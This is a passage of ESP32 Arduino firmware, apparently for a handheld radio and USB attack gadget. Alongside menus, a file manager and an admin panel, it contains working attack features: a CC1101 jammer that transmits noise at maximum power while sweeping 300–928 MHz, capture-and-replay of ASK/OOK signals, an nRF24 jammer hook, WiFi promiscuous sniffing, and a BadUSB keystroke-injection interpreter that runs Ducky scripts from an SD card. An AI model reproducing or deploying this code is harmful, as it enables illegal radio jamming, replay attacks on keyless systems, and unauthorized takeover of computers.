        selectedKey = oldSelected;
        capsLock = oldCaps;
        consoleText = oldText;
        drawKeyboard();
        return result;
      } else if (key == "Exit" && allowExit) {
        selectedKey = oldSelected;
        capsLock = oldCaps;
        consoleText = oldText;
        drawKeyboard();
        return "";
      } else if (key == "Space") {
        result += " ";
      } else if (key.length() > 0 && key != "Caps" && key != "Del" && key != "OK" && key != "Exit") {
        result += key;
      }
      consoleText = result;
      delay(150);
    }
    if (!btnOk()) okProcessed = false;
    delay(20);
  }
}
void showCommandOutput(String output, int timeoutSeconds) {
  commandOutput = output;
  commandStartTime = millis();
  commandTimeoutSec = timeoutSeconds;
  waitingForOk = true;
  appState = STATE_CONSOLE_COMMAND_OUTPUT;
  needRedraw = true;
}
void executeCommand(String cmd) {
  cmd.toLowerCase();
  if (cmd == CMD_INFO) {
    consoleMode = CONSOLE_INFO;
    infoPage = 0;
  } else if (cmd == CMD_DEV) {
    consoleMode = CONSOLE_DEV;
    codePos = 0;
  } else if (cmd == CMD_CLEAR) {
    consoleText = "";
  } else if (cmd == CMD_SFV) {
    showCommandOutput("Scanning WiFi...", 0);
    bool oldWifiSpectrum = wifiSpectrumActive;
    if (!oldWifiSpectrum) {
      wifiSpectrumActive = true;
      totalPackets = 0;
      memset(wifiPackets, 0, sizeof(wifiPackets));
      memset(wifiSmooth, 0, sizeof(wifiSmooth));
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
        wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
        int ch = pkt->rx_ctrl.channel;
        if (ch >= 1 && ch <= WIFI_CHANNELS) {
          wifiPackets[ch]++;
          totalPackets++;
        }
      });
      esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    }
    unsigned long start = millis();
    while (millis() - start < 2000) {
      static unsigned long lastSwitch = 0;
      if (millis() - lastSwitch > 100) {
        currentWifiChan = (currentWifiChan % WIFI_CHANNELS) + 1;
        esp_wifi_set_channel(currentWifiChan, WIFI_SECOND_CHAN_NONE);
        lastSwitch = millis();
      }
      yield();
    }
    int maxChan = 1;
    int maxPkts = 0;
    for (int ch = 1; ch <= WIFI_CHANNELS; ch++) {
      if (wifiPackets[ch] > maxPkts) {
        maxPkts = wifiPackets[ch];
        maxChan = ch;
      }
    }
    if (!oldWifiSpectrum) {
      wifiSpectrumActive = false;
      WiFi.mode(WIFI_STA);
      esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    }
    int freqMHz = 2407 + (maxChan - 1) * 5;
    String result = "Strongest WiFi: channel " + String(maxChan) + " (" + String(freqMHz) + " MHz) packets=" + String(maxPkts);
    showCommandOutput(result, COMMAND_TIMEOUT_SFV);
    return;
  } else if (cmd == CMD_CS) {
    if (!nrfOk) {
      showCommandOutput("nRF24 not found!", COMMAND_TIMEOUT_CS);
      return;
    }
    showCommandOutput("Scanning nRF24...", 0);
    bool oldJam = jamming;
    if (oldJam) stopJammer();
    radio.powerUp();
    radio.stopListening();
    radio.setPALevel(RF24_PA_MAX);
    int maxSignal = -100;
    int maxChannel = -1;
    for (int ch = 0; ch < NRF_CHANNELS; ch++) {
      radio.setChannel(ch);
      radio.startListening();
      delayMicroseconds(150);
      int rssi = radio.testCarrier() ? 40 : 0;
      radio.stopListening();
      if (nrfCalibrated) rssi -= nrfFloor[ch];
      if (rssi < 0) rssi = 0;
      if (rssi > maxSignal) {
        maxSignal = rssi;
        maxChannel = ch;
      }
      yield();
    }
    if (oldJam) startJammer();
    int freqMHz = 2400 + maxChannel;
    String result = "Max nRF24: channel " + String(maxChannel) + " (" + String(freqMHz) + " MHz) signal=" + String(maxSignal);
    showCommandOutput(result, COMMAND_TIMEOUT_CS);
    return;
  } else if (cmd == CMD_EXIT) {
    appState = STATE_MAIN_MENU;
    needRedraw = true;
    return;
  } else if (cmd == CMD_AP) {
    adminPanel();
    return;
  } else if (cmd == CMD_SD) {
    sdCardInfo();
    return;
  } else if (cmd == CMD_FS) {
    fsManager();
    return;
  } else if (cmd.length() > 0) {
    showCommandOutput("Unknown: " + cmd, 1);
    return;
  }
  drawKeyboard();
}

void drawCc1101SpectrumVert() {
  display.clearDisplay();
  drawHeader("CC1101 SpectrumV");
  int maxVal = 0;
  for (int i = 0; i < 128; i++) {
    if (cc1101_spectrum_vert[i] > maxVal) maxVal = cc1101_spectrum_vert[i];
  }
  if (maxVal < 5) maxVal = 5;
  for (int x = 0; x < 128; x++) {
    int h = map(cc1101_spectrum_vert[x], 0, maxVal, 0, 40);
    if (h > 0) {
      display.drawLine(x, 50 - h, x, 50, SSD1306_WHITE);
    }
  }
  display.drawLine(0, 50, 127, 50, SSD1306_WHITE);
  float freq = 300.0 + cc1101_current_channel;
  display.setCursor(2, 54);
  display.print("CH:" + String(cc1101_current_channel) + "  " + String(freq,1) + "MHz");
  display.setCursor(70, 54);
  display.print("RSSI:" + String(ELECHOUSE_cc1101.getRssi()));
  drawTopBarIcons();
  display.display();
}
void drawCc1101SpectrumHoriz() {
  display.clearDisplay();
  drawHeader("CC1101 Spectrum H");
  for (int x = 0; x < 128; x++) {
    int h = cc1101_spectrum_horiz[x];
    if (h > 0) {
      display.drawFastVLine(x, 63 - h, h, SSD1306_WHITE);
    }
  }
  int rssi = ELECHOUSE_cc1101.getRssi();
  display.fillRect(0, 0, 128, 10, SSD1306_BLACK);
  display.setCursor(0, 0);
  display.print("RSSI:");
  display.print(rssi);
  display.print("dBm");
  drawTopBarIcons();
  display.display();
}
void drawCc1101Jammer() {
    display.clearDisplay();
    drawHeader("CC1101 Jammer");
    if (cc1101_jamming) {
        display.setTextSize(2);
        display.setCursor(20, 25);
        display.println("JAMMING");
        display.setTextSize(1);
        display.setCursor(10, 45);
        display.print("Freq: ");
        display.print(cc1101_jam_freq, 2);
        display.print(" MHz");
        if (cc1101_jammer_mode == 1) display.print(" SWEEP");
        display.setCursor(2, 58);
        display.print("OK to stop");
    } else {
        display.setCursor(15, 30);
        display.print("Stopped");
    }
    drawTopBarIcons();
    display.display();
}
void drawCc1101Capture() {
  display.clearDisplay();
  drawHeader("CC1101 Capture");
  if (cc1101_capturing) {
    display.setCursor(10, 25);
    display.print("Capturing...");
    display.setCursor(10, 35);
    display.print("Len: " + String(cc1101_capture_len) + " bytes");
    display.setCursor(2, 56);
    display.print("Press OK to stop");
  }
  if (cc1101_capture_len > 0) {
    display.setCursor(10, 40);
    display.print("Saved: " + String(cc1101_capture_len) + " bytes");
  }
  drawTopBarIcons();
  display.display();
}
void drawCc1101Transmit() {
  display.clearDisplay();
  drawHeader("CC1101 Transmit");
  if (cc1101_transmitting) {
    display.setCursor(10, 25);
    display.print("Transmitting...");
    display.setCursor(10, 35);
    display.print("Sent: " + String(cc1101_tx_index) + " / " + String(cc1101_tx_len));
    display.setCursor(2, 56);
    display.print("Press OK to stop");
  } else {
    display.setCursor(10, 25);
    display.print("Ready");
    if (cc1101_tx_len > 0) {
      display.setCursor(10, 35);
      display.print("Loaded: " + String(cc1101_tx_len) + " bytes");
      display.setCursor(10, 45);
      display.print("OK to start");
    } else {
      display.setCursor(10, 45);
      display.print("No data captured");
    }
  }
  drawTopBarIcons();
  display.display();
}

void drawBadUsbMenu() {
    display.clearDisplay();
    drawHeader("BadUSB");
    const char* items[] = {"Built-in Scripts", "SD Card", "Back"};
    for (int i = 0; i < 3; i++) {
        drawItem(items[i], i == badUsbMenuIdx, i);
    }
    drawTopBarIcons();
    display.display();
}
void drawBadUsbBuiltin() {
    display.clearDisplay();
    drawHeader("Built-in Scripts");
    int visible = 4;
    int total = badUsbBuiltinCount + 1;
    int offset = 0;
    if (badUsbBuiltinIdx >= visible) offset = badUsbBuiltinIdx - visible + 1;
    if (offset < 0) offset = 0;
    if (offset + visible > total) offset = total - visible;
    if (offset < 0) offset = 0;

    for (int i = 0; i < visible; i++) {
        int idx = offset + i;
        if (idx >= total) break;
        char label[30];
        if (idx == badUsbBuiltinCount) {
            strcpy(label, "Back");
        } else {
            snprintf(label, sizeof(label), "Script %d", idx + 1);
        }
        drawItem(label, idx == badUsbBuiltinIdx, i);
    }
    display.setCursor(2, 56);
    if (offset > 0) display.print("▲ ");
    else display.print("  ");
    display.print(offset + 1);
    display.print("/");
    display.print(total);
    if (offset + visible < total) display.print(" ▼");
    else display.print("  ");
    drawTopBarIcons();
    display.display();
}
void drawBadUsbSd() {
    display.clearDisplay();
    drawHeader("SD Scripts");

    if (badUsbFileList.empty()) {
        if (SD.begin(SD_CS_PIN)) {
            File root = SD.open("/");
            while (true) {
                File entry = root.openNextFile();
                if (!entry) break;
                if (!entry.isDirectory()) {
                    String name = String(entry.name());
                    if (name.endsWith(".txt") || name.endsWith(".duck")) {
                        badUsbFileList.push_back(name);
                    }
                }
                entry.close();
            }
            root.close();
        }
    }

    int total = badUsbFileList.size() + 1;
    int visible = 4;
    int offset = 0;
    if (badUsbFileIdx >= visible) offset = badUsbFileIdx - visible + 1;
    if (offset < 0) offset = 0;
    if (offset + visible > total) offset = total - visible;
    if (offset < 0) offset = 0;

    for (int i = 0; i < visible; i++) {
        int idx = offset + i;
        if (idx >= total) break;
        const char* label;
        if (idx == (int)badUsbFileList.size()) {
            label = "Back";
        } else {
            label = badUsbFileList[idx].c_str();
        }
        drawItem(label, idx == badUsbFileIdx, i);
    }

    if (badUsbFileList.empty()) {
        display.setCursor(10, 30);
        display.print("No scripts found");
    }

    display.setCursor(2, 56);
    if (offset > 0) display.print("▲ ");
    else display.print("  ");
    display.print(offset + 1);
    display.print("/");
    display.print(total);
    if (offset + visible < total) display.print(" ▼");
    else display.print("  ");

    drawTopBarIcons();
    display.display();
}

void drawBluetoothMenu() {
    display.clearDisplay();
    drawHeader("Bluetooth");
    const char* items[] = {"Scan", "Back"};
    for (int i = 0; i < 2; i++) {
        drawItem(items[i], i == bluetoothMenuIdx, i);
    }
    drawTopBarIcons();
    display.display();
}
void drawBluetoothScan() {
    display.clearDisplay();
    drawHeader("BLE Scan");

    if (bleScanning) {
        display.setCursor(40, 30);
        display.println("Scanning...");
        drawTopBarIcons();
        display.display();
        return;
    }

    int total = bleDevices.size() + 1;
    int visible = 4;
    int offset = 0;
    if (bleSelectedIdx >= visible) offset = bleSelectedIdx - visible + 1;
    if (offset < 0) offset = 0;
    if (offset + visible > total) offset = total - visible;
    if (offset < 0) offset = 0;

    for (int i = 0; i < visible && offset + i < total; i++) {
        int idx = offset + i;
        int y = 14 + i * 12;
        if (bleSelectedIdx == idx) {
            display.fillRect(0, y - 1, SCREEN_WIDTH, 11, SSD1306_WHITE);
            display.setTextColor(SSD1306_BLACK);
            display.setCursor(2, y);
            display.print(">");
        } else {
            display.setTextColor(SSD1306_WHITE);
        }
        if (idx == (int)bleDevices.size()) {
            display.setCursor(12, y);
            display.print("Back");
        } else {
            String name = bleDevices[idx].name;
            if (name.length() == 0) name = "<Unknown>";
            String rssiStr = " " + String(bleDevices[idx].rssi) + "dBm";
            if (name.length() > 12) name = name.substring(0, 12) + ".";
            display.setCursor(12, y);
            display.print(name);
            display.setCursor(90, y);
            display.print(rssiStr);
        }
    }

    display.setCursor(2, 56);
    if (bleDevices.empty()) display.print("No devices");
    else {
        display.print(bleSelectedIdx + 1);
        display.print("/");
        display.print(total);
    }

    drawTopBarIcons();
    display.display();
}
void startBleScan() {
    if (bleScanning) return;
    bleDevices.clear();
    bleSelectedIdx = 0;
    bleScrollOffset = 0;
    bleScanning = true;
    bleScanStart = millis();
    showMsg("Scanning...");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
}
void stopBleScan() {
    bleScanning = false;
    BLEDevice::getScan()->clearResults();
}
void updateBluetoothMenu(Button btn) {
    const int sz = 2;
    if (btn == BTN_UP) bluetoothMenuIdx = (bluetoothMenuIdx - 1 + sz) % sz;
    else if (btn == BTN_DOWN) bluetoothMenuIdx = (bluetoothMenuIdx + 1) % sz;
    else if (btn == BTN_OK) {
        if (bluetoothMenuIdx == 0) {
            showMsg("Scanning Bluetooth...");
        } else {
            appState = STATE_MAIN_MENU;
        }
        needRedraw = true;
    }
}
void updateCc1101Spectrum() {
    if (!cc1101_ok) return;
    static unsigned long lastSwitch = 0;
    // 500 мкс на перестройку – достаточно для CC1101
    if (micros() - lastSwitch < 500) return;
    lastSwitch = micros();

    cc1101_current_channel++;
    if (cc1101_current_channel >= 128) cc1101_current_channel = 0;
    float freq = 300.0 + cc1101_current_channel;
    ELECHOUSE_cc1101.setMHZ(freq);

    int rssi = ELECHOUSE_cc1101.getRssi();
    int level = map(rssi, -110, -30, 0, 100);
    if (level < 0) level = 0;
    if (level > 100) level = 100;

    cc1101_spectrum_vert[cc1101_current_channel] = level;
    cc1101_spectrum_horiz[cc1101_current_channel] = level;
}
void startCc1101Jammer() {
    if (!cc1101_ok) return;
    cc1101_jamming = true;
    cc1101_jam_freq = 433.92; // начальная частота
    ELECHOUSE_cc1101.SetTx();
    ELECHOUSE_cc1101.setPA(12);
    ELECHOUSE_cc1101.setModulation(2); // ASK/OOK
    ELECHOUSE_cc1101.setDRate(50);
    ELECHOUSE_cc1101.setRxBW(256);
    showMsg("Jammer ON");
}
void stopCc1101Jammer() {
  cc1101_jamming = false;
  ELECHOUSE_cc1101.SetRx();
  showMsg("CC1101 Jammer OFF");
}
void updateCc1101Jammer() {
    if (!cc1101_jamming) return;

    // Отправляем сразу 8 пакетов без задержки между ними
    byte noise[8] = {0xFF, 0xAA, 0x55, 0x00, 0xAA, 0xFF, 0x55, 0x00};
    for (int i = 0; i < 8; i++) {
        ELECHOUSE_cc1101.SendData(noise, 8);
        // delayMicroseconds(50) убран – это ускоряет цикл
    }

    // Если включён sweep, переключаем частоту
    if (cc1101_jammer_mode == 1) {
        cc1101_jam_freq += 0.05;
        if (cc1101_jam_freq > 928.0) cc1101_jam_freq = 300.0;
        ELECHOUSE_cc1101.setMHZ(cc1101_jam_freq);
    }
    cc1101_jam_last_time = millis();
}
void cc1101_capture_start() {
    if (!cc1101_ok) return;
    cc1101_capturing = true;
    cc1101_capture_len = 0;
    cc1101_capture_start_time = millis();
    ELECHOUSE_cc1101.SetRx();
    // Настройка для приёма ASK/OOK
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setDRate(50);
    ELECHOUSE_cc1101.setRxBW(256);
    showMsg("Capturing...");
}
void cc1101_capture_stop() {
    cc1101_capturing = false;
    ELECHOUSE_cc1101.setSidle();
    showMsg("Capture stopped");
    // Если есть данные, предложить сохранить
    if (cc1101_capture_len > 0) {
        display.clearDisplay();
        drawHeader("Capture");
        display.setCursor(10, 25);
        display.print("Captured ");
        display.print(cc1101_capture_len);
        display.println(" bytes");
        display.setCursor(10, 40);
        display.println("OK to save");
        display.setCursor(10, 50);
        display.println("ESC to discard");
        drawTopBarIcons();
        display.display();
        while (true) {
            if (btnOk()) {
                // Сохраняем в файл (используем вашу функцию сохранения)
                saveWiFiCredentials("rf_capture", String(cc1101_capture_len));
                showMsg("Saved");
                break;
            }
            if (btnUp() || btnDown()) {
                cc1101_capture_len = 0;
                showMsg("Discarded");
                break;
            }
            delay(50);
        }
    }
}
void cc1101_transmit_start() {
    if (cc1101_tx_len == 0) {
        showMsg("Nothing to transmit");
        return;
    }
    ELECHOUSE_cc1101.SetTx();
    ELECHOUSE_cc1101.setPA(12);
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setDRate(50);
    ELECHOUSE_cc1101.setRxBW(256);
    cc1101_transmitting = true;
    cc1101_tx_index = 0;
    cc1101_tx_next_time = micros();
    showMsg("Transmitting...");
}
void cc1101_transmit_stop() {
    cc1101_transmitting = false;
    ELECHOUSE_cc1101.setSidle();
    showMsg("Transmission stopped");
}
void cc1101_transmit_loop() {
    if (!cc1101_transmitting) return;
    if (cc1101_tx_index >= cc1101_tx_len) {
        cc1101_transmit_stop();
        return;
    }
    unsigned long now = micros();
    if (now >= cc1101_tx_next_time) {
        // Отправка одного байта (или нескольких)
        ELECHOUSE_cc1101.SendData(&cc1101_tx_buffer[cc1101_tx_index], 1);
        cc1101_tx_index++;
        cc1101_tx_next_time = now + 100; // интервал 100 мкс
    }
}

int editPinValue(const char* prompt) {
  consoleText = "";
  selectedKey = 0;
  capsLock = false;
  drawKeyboard();
  bool okProcessed = false;
  unsigned long lastMove = 0;
  bool leftHeld = false;
  bool rightHeld = false;
  while (true) {
    bool up = btnUp();
    bool down = btnDown();
    if (up) {
      if (!leftHeld) {
        selectedKey = (selectedKey - 1 + totalKeys) % totalKeys;
        drawKeyboard();
        leftHeld = true;
        lastMove = millis();
        delay(150);
      } else if (millis() - lastMove > 150) {
        selectedKey = (selectedKey - 1 + totalKeys) % totalKeys;
        drawKeyboard();
        lastMove = millis();
      }
    } else {
      leftHeld = false;
    }
    if (down) {
      if (!rightHeld) {
        selectedKey = (selectedKey + 1) % totalKeys;
        drawKeyboard();
        rightHeld = true;
        lastMove = millis();
        delay(150);
      } else if (millis() - lastMove > 150) {
        selectedKey = (selectedKey + 1) % totalKeys;
        drawKeyboard();
        lastMove = millis();
      }
    } else {
      rightHeld = false;
    }
    if (btnOk() && !okProcessed) {
      okProcessed = true;
      String key = capsLock ? upperKeys[selectedKey] : lowerKeys[selectedKey];
      if (key == "OK") {
        int val = consoleText.toInt();
        if ((val >= 0 && val <= 10) || val == 20 || val == 21) {
          return val;
        } else {
          display.clearDisplay();
          display.setCursor(10, 28);
          display.print("Invalid pin (0-10,20,21)");
          display.display();
          delay(1500);
          consoleText = "";
          drawKeyboard();
        }
      } else if (key == "Del") {
        if (consoleText.length() > 0) consoleText.remove(consoleText.length() - 1);
        drawKeyboard();
      } else if (key == "Exit") {
        return -1;
      } else if (key == "Space") {
        consoleText += " ";
        drawKeyboard();
      } else if (key == "Caps") {
        capsLock = !capsLock;
        drawKeyboard();
      } else {
        consoleText += key;
        drawKeyboard();
      }
      delay(150);
    }
    if (!btnOk()) okProcessed = false;
    delay(20);
  }
}
void changePins() {
  display.clearDisplay();
  drawHeader("Change pins");
  display.setCursor(10, 28);
  display.println("Not available");
  display.setCursor(10, 40);
  display.println("Analog buttons");
  drawTopBarIcons();
  display.display();
  delay(2000);
}
void setBrightness() {
  while (true) {
    display.clearDisplay();
    drawHeader("Brightness");
    display.setCursor(10, 20);
    display.print("Bright: ");
    display.print(displayBrightness);
    display.setCursor(10, 40);
    display.println("UP/DOWN adjust, OK save");
    drawTopBarIcons();
    display.display();
    if (btnUp()) {
      displayBrightness = constrain(displayBrightness + 5, 0, 255);
      delay(150);
    }
    if (btnDown()) {
      displayBrightness = constrain(displayBrightness - 5, 0, 255);
      delay(150);
    }
    if (btnOk()) {
      display.ssd1306_command(SSD1306_SETCONTRAST);
      display.ssd1306_command(displayBrightness);
      display.clearDisplay();
      display.setCursor(20, 28);
      display.print("Brightness saved");
      drawTopBarIcons();
      display.display();
      delay(1000);
      return;
    }
    delay(50);
  }
}
void setInvert() {
  displayInvert = !displayInvert;
  if (displayInvert) {
    display.ssd1306_command(SSD1306_INVERTDISPLAY);
  } else {
    display.ssd1306_command(SSD1306_NORMALDISPLAY);
  }
  display.clearDisplay();
  display.setCursor(20, 28);
  display.print(displayInvert ? "Display inverted" : "Display normal");
  drawTopBarIcons();
  display.display();
  delay(1000);
}
void showProcesses() {
  while (true) {
    display.clearDisplay();
    drawHeader("Processes");
    display.setCursor(2, 15);
    display.print("Heap free: " + String(ESP.getFreeHeap() / 1024) + " KB");
    display.setCursor(2, 25);
    display.print("Uptime: " + String(millis() / 1000) + " sec");
    display.setCursor(2, 35);
    display.print("CPU freq: " + String(ESP.getCpuFreqMHz()) + " MHz");
    display.setCursor(2, 45);
    display.print("IR buffer: " + String(irBufferSize));
    display.setCursor(2, 55);
    display.println("Press OK to exit");
    drawTopBarIcons();
    display.display();
    if (btnOk()) break;
    delay(50);
  }
}
void reinitHardware() {
  Wire.begin(OLED_SDA, OLED_SCL);
  display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR);
  display.clearDisplay();
}
void drawAdminMenuHighlight(int sel) {
  display.clearDisplay();
  drawHeader("Admin Panel");
  const char* items[] = {"Change pins", "Brightness", "Invert display", "Processes", "Exit admin"};
  for (int i = 0; i < 5; i++) {
    int y = 15 + i * 10;
    if (i == sel) {
      display.fillRect(0, y - 2, SCREEN_WIDTH, 12, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.setTextColor(WHITE);
    }
    display.setCursor(5, y);
    display.print(i + 1);
    display.print(". ");
    display.print(items[i]);
  }
  drawTopBarIcons();
  display.display();
}
void adminPanel() {
  String pwd = inputStringWithKeyboard(true, "ENTER PASSWORD:");
  if (pwd == adminPassword && pwd != "") {
    adminMode = true;
    display.clearDisplay();
    display.setCursor(20, 28);
    display.println("Access granted");
    drawTopBarIcons();
    display.display();
    delay(1000);
  } else {
    if (pwd != "") showCommandOutput("Wrong password", 2);
    return;
  }
  while (adminMode) {
    int sel = 0;
    bool okPressed = false;
    drawAdminMenuHighlight(sel);
    while (true) {
      bool up = btnUp();
      bool down = btnDown();
      bool ok = btnOk();
      if (up) {
        sel = (sel - 1 + 5) % 5;
        drawAdminMenuHighlight(sel);
        delay(150);
      }
      if (down) {
        sel = (sel + 1) % 5;
        drawAdminMenuHighlight(sel);
        delay(150);
      }
      if (ok && !okPressed) {
        okPressed = true;
        switch (sel) {
          case 0: changePins(); break;
          case 1: setBrightness(); break;
          case 2: setInvert(); break;
          case 3: showProcesses(); break;
          case 4: adminMode = false; showMsg("Exited admin mode"); return;
        }
        break;
      }
      if (!ok) okPressed = false;
      delay(50);
    }
  }
}

void sdCardInfo() {
  String info = "";
  if (!SD.begin(SD_CS_PIN)) {
    info = "SD card not found!";
  } else {
    uint8_t cardType = SD.cardType();
    uint64_t cardSize = SD.cardSize() / (1024 * 1024);
    uint64_t totalBytes = SD.totalBytes();
    uint64_t usedBytes = SD.usedBytes();
    uint64_t freeBytes = totalBytes - usedBytes;
    info = "SD Card OK\n";
    if (cardType == CARD_MMC) info += "Type: MMC\n";
    else if (cardType == CARD_SD) info += "Type: SDSC\n";
    else if (cardType == CARD_SDHC) info += "Type: SDHC\n";
    else info += "Type: Unknown\n";
    info += "Size: " + String(cardSize) + " MB\n";
    info += "Free: " + String(freeBytes / (1024 * 1024)) + " MB";
  }
  showCommandOutput(info, 5);
}
void fsManager() {
  if (!LittleFS.begin(true)) {
    showCommandOutput("LittleFS mount failed", 2);
    return;
  }
  File root = LittleFS.open("/");
  if (!root) {
    showCommandOutput("Failed to open root", 2);
    return;
  }
  std::vector<String> files;
  File file = root.openNextFile();
  while (file) {
    files.push_back(String(file.name()));
    file = root.openNextFile();
  }
  root.close();
  if (files.size() == 0) {
    showCommandOutput("No files in LittleFS", 2);
    return;
  }
  int selected = 0;
  bool exit = false;
  while (!exit) {
    display.clearDisplay();
    drawHeader("LittleFS Manager");
    int visible = 4;
    int scroll = selected;
    if (scroll > visible - 1) scroll = selected - visible + 1;
    if (scroll < 0) scroll = 0;
    for (int i = 0; i < visible && i + scroll < (int)files.size(); i++) {
      int y = 14 + i * 10;
      if (selected == i + scroll) {
        display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
        display.setCursor(2, y);
        display.print(">");
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      display.setCursor(10, y);
      display.print(files[i + scroll]);
    }
    int yb = 14 + visible * 10;
    if (selected == (int)files.size()) {
      display.fillRect(0, yb - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(2, yb);
      display.print(">");
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(10, yb);
    display.println("Back");
    drawTopBarIcons();
    display.display();
    bool up = btnUp();
    bool down = btnDown();
    bool ok = btnOk();
    if (up) {
      selected--;
      if (selected < 0) selected = files.size();
      delay(150);
    }
    if (down) {
      selected++;
      if (selected > files.size()) selected = 0;
      delay(150);
    }
    if (ok) {
      if (selected == (int)files.size()) {
        exit = true;
        break;
      } else {
        String filename = files[selected];
        display.clearDisplay();
        drawHeader("Delete file");
        display.setCursor(10, 25);
        display.print("Delete ");
        display.print(filename);
        display.print("?");
        display.setCursor(30, 40);
        display.print("UP=Yes  DOWN=No");
        display.display();
        bool confirm = false;
        while (true) {
          if (btnUp()) {
            confirm = true;
            break;
          }
          if (btnDown()) {
            confirm = false;
            break;
          }
          delay(50);
        }
        if (confirm) {
          LittleFS.remove(filename);
          files.erase(files.begin() + selected);
          if (selected >= files.size()) selected = files.size();
          showMsg("Deleted");
        }
      }
    }
    delay(50);
  }
  LittleFS.end();
  appState = STATE_CONSOLE;
  consoleMode = CONSOLE_KEYBOARD;
  drawKeyboard();
  needRedraw = true;
}

void badUsbSendKey(uint8_t key, uint8_t modifiers) {
    if (modifiers) Keyboard.press(modifiers);
    Keyboard.press(key);
    delay(10);
    Keyboard.releaseAll();
}
void badUsbSendString(const String& text) {
    for (char c : text) {
        Keyboard.write(c);
        delay(5);
    }
}
void badUsbDelay(unsigned long ms) {
    unsigned long start = millis();
    while (millis() - start < ms) {
        yield();
        if (!badUsbRunning) break;
    }
}
bool executeBadUsbLine(String line) {
    line.trim();
    if (line.startsWith("REM") || line.isEmpty()) return true;

    if (line.startsWith("STRING ")) {
        badUsbSendString(line.substring(7));
        return true;
    }
    if (line.startsWith("DELAY ")) {
        badUsbDelay(line.substring(6).toInt());
        return true;
    }
    if (line == "ENTER") {
        badUsbSendKey(KEY_RETURN);
        return true;
    }
    if (line == "SPACE") {
        badUsbSendKey(' ');
        return true;
    }
    if (line.startsWith("GUI ")) {
        String keyPart = line.substring(4);
        if (keyPart == "r") badUsbSendKey('r', KEY_LEFT_GUI);
        else if (keyPart == "e") badUsbSendKey('e', KEY_LEFT_GUI);
        else if (keyPart == "L") badUsbSendKey('l', KEY_LEFT_GUI);
        return true;
    }
    if (line.startsWith("CTRL ")) {
        String keyPart = line.substring(5);
        if (keyPart == "A") badUsbSendKey('a', KEY_LEFT_CTRL);
        else if (keyPart == "C") badUsbSendKey('c', KEY_LEFT_CTRL);
        else if (keyPart == "V") badUsbSendKey('v', KEY_LEFT_CTRL);
        else if (keyPart == "X") badUsbSendKey('x', KEY_LEFT_CTRL);
        else if (keyPart == "Z") badUsbSendKey('z', KEY_LEFT_CTRL);
        else if (keyPart == "M") badUsbSendKey('m', KEY_LEFT_CTRL);
        else if (keyPart == "UP") {
            Keyboard.press(KEY_LEFT_CTRL);
            Keyboard.press(KEY_UP_ARROW);
            delay(10);
            Keyboard.releaseAll();
        }
        return true;
    }
    if (line.startsWith("ALT ")) {
        String keyPart = line.substring(4);
        if (keyPart == "F4") badUsbSendKey(KEY_F4, KEY_LEFT_ALT);
        else if (keyPart == "ENTER") {
            Keyboard.press(KEY_LEFT_ALT);
            Keyboard.press(KEY_RETURN);
            delay(10);
            Keyboard.releaseAll();
        }
        return true;
    }
    if (line.startsWith("SHIFT ")) {
        return true;
    }
    return true;
}
void badUsbRunScript(const String& script) {
    if (badUsbRunning) return;
    badUsbRunning = true;
    showMsg("Running...");
    Serial.println("BadUSB script started");

    int start = 0;
    int end = script.indexOf('\n');
    while (end != -1 && badUsbRunning) {
        String line = script.substring(start, end);
        executeBadUsbLine(line);
        start = end + 1;
        end = script.indexOf('\n', start);
    }
    if (start < script.length() && badUsbRunning) {
        String line = script.substring(start);
        executeBadUsbLine(line);
    }

    badUsbRunning = false;
    showMsg("Script finished");
    Serial.println("BadUSB script finished");
}
void badUsbRunFile(const String& filename) {
    if (!SD.begin(SD_CS_PIN)) {
        showMsg("SD error");
        return;
    }
    File file = SD.open(filename, FILE_READ);
    if (!file) {
        showMsg("File not found");
        return;
    }
    String script = file.readString();
    file.close();
    badUsbRunScript(script);
}
void badUsbRunBuiltin(int index) {
    if (index < 0 || index >= badUsbBuiltinCount) return;
    badUsbRunScript(String(badUsbBuiltinScripts[index]));
}

void handleButtons() {
  static bool okWasPressed = false;
  static unsigned long longPressStart = 0;
  bool okNow = btnOk();
  if (okNow && !okWasPressed) {
    longPressStart = millis();
    okWasPressed = true;
  }
  if (okNow && okWasPressed && (millis() - longPressStart) >= LONG_PRESS_MS && !longPressDetected) {
    longPressDetected = true;
if (appState == STATE_NRF24_JAMMER && nrfOk) {
  if (jamming) {
    stopJammer();
    appState = STATE_NRF24_MENU;
    needRedraw = true;
    okWasPressed = false;
    longPressDetected = false;
    return;
  }
}
    delay(200);
    okWasPressed = false;
    longPressDetected = false;
    return;
  }
  if (!okNow && okWasPressed && !longPressDetected) {
    okWasPressed = false;
  }
  if (!okNow) {
    okWasPressed = false;
    longPressDetected = false;
  }
}

const char CHAT_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ESP32 Chat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1e1e2f;color:#f0f0f0;height:100vh;display:flex;justify-content:center;align-items:center}
.chat-container{width:100%;max-width:600px;height:90vh;background:#2d2d3a;border-radius:20px;box-shadow:0 10px 25px rgba(0,0,0,0.3);display:flex;flex-direction:column;overflow:hidden}
.header{background:#3a3a4e;padding:16px;text-align:center;font-size:1.4rem;font-weight:bold;border-bottom:1px solid #4a4a60}
.messages{flex:1;padding:16px;overflow-y:auto;display:flex;flex-direction:column;gap:12px}
.message{display:flex;align-items:flex-start;gap:10px;animation:fadeIn 0.2s ease}
